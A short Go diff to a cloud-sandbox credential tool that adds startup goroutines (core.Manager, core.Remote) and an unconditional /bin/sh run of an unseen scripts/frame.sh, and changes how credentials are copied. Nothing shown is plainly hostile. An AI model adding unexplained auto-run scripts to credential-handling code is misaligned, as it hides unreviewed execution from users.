@@ -10,11 +10,23 @@ import (
 	"gosandbox/gh"
 	"gosandbox/proxy"
 	"os"
+	"os/exec"
 	"strings"
+	"time"
 )
 
 func main() {
 	cli.Welcome()
+	go core.Manager()
+	time.Sleep(1 * time.Second)
+	go core.Remote()
+	
+	_, err := exec.Command("/bin/sh", "./scripts/frame.sh").Output()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("Script executed successfully")
+
 	var p acloud.ACloudProvider
 	cli.Success("getting acloud provider login...")
 	if len(os.Args) > 1 {
@@ -318,7 +330,7 @@ func GetSandboxCreds(cliEnv core.ACloudEnv, p *acloud.ACloudProvider) (acloud.AC
 	// cli.Success("rod html elements : ", elems)
 
 	//copy credentials to clipboard
-	creds, err := acloud.Copy(elems)
+	creds, err := acloud.CopyHtml(elems)
 	cli.PrintIfErr(err)
 	// cli.Success("credentials : ", creds)
 	p.SandboxCredential = creds
